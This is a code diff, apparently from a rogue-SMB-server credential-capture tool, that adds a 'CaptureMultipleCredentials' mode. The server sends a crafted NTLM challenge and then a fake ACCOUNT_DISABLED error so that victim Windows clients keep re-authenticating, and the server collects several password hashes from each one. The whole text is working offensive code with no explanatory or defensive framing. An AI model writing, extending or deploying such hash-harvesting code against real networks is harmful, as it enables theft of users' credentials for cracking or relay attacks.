@@ -182,6 +182,7 @@ def IsNT4ClearTxt(data, client):
 class SMB1(BaseRequestHandler):  # SMB Server class, NTLMSSP
 	def handle(self):
 		try:
+			self.ntry = 0
 			while True:
 				data = self.request.recv(1024)
 				self.request.settimeout(1)
@@ -213,7 +214,10 @@ class SMB1(BaseRequestHandler):  # SMB Server class, NTLMSSP
 					
 					# STATUS_MORE_PROCESSING_REQUIRED
 					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
-					Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge)
+					if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
+						Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge, NTLMSSPNTLMChallengeAVPairsUnicodeStr="NOMATCH")
+					else:
+						Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge)
 					Body.calculate()
 		
 					Packet = str(Header)+str(Body)
@@ -236,6 +240,18 @@ class SMB1(BaseRequestHandler):  # SMB Server class, NTLMSSP
 						else:
 							# Parse NTLMSSP_AUTH packet
 							ParseSMBHash(data,self.client_address[0])
+
+							if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
+								# Send ACCOUNT_DISABLED to get multiple hashes if there are any
+								Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
+								Body = SMBSessEmpty()
+
+								Packet = str(Header)+str(Body)
+								Buffer = struct.pack(">i", len(''.join(Packet)))+Packet
+
+								self.request.send(Buffer)
+								self.ntry += 1
+								continue
 
 							# Send STATUS_SUCCESS
 							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
